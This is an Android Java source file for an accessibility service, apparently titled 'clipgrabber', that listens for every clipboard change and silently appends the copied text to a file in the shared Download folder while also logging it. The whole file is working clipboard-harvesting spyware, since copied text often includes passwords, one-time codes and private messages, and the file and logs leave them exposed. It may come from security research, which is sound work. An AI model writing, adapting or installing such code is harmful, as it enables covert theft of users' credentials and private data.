package com.synack.clipgrabber;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.content.ClipboardManager;
import android.content.Context;
import android.util.Log;

import java.io.FileWriter;
import java.io.File;
import java.io.IOException;

public class ClipAccessibilityService extends AccessibilityService {

    ClipboardManager clipboard;
    String lastClip = "";
    File saveFile;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        saveFile = new File("/storage/emulated/0/Download/clipboard.txt");

        clipboard.addPrimaryClipChangedListener(() -> {
            String newClip = clipboard.getText().toString();
            if (!newClip.equals(lastClip)) {
                lastClip = newClip;
                appendToFile(newClip);
            }
        });

        Log.d("CLIP_ACCESS", "Accessibility Service started");
    }

    void appendToFile(String text) {
        try {
            FileWriter writer = new FileWriter(saveFile, true);
            writer.append(text).append("\n---\n");
            writer.close();
            Log.d("CLIP_ACCESS", "Saved: " + text);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {}

    @Override
    public void onInterrupt() {}
}